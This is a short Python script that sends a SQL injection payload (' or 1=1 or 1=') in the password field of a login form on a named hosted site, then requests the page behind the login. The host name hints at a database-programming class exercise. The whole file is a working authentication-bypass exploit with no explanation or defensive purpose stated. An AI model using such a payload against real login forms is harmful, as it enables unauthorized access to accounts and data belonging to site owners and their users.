import requests

url = 'http://dbprog2019.epizy.com/login.php'
requestUrl = 'http://dbprog2019.epizy.com/welcome.php'
data = {'username': "munkhjin",
		'password': "' or 1=1 or 1='"
		 }


session = requests.Session()
r = session.post(url, data=data)
r = session.get(requestUrl)

r.text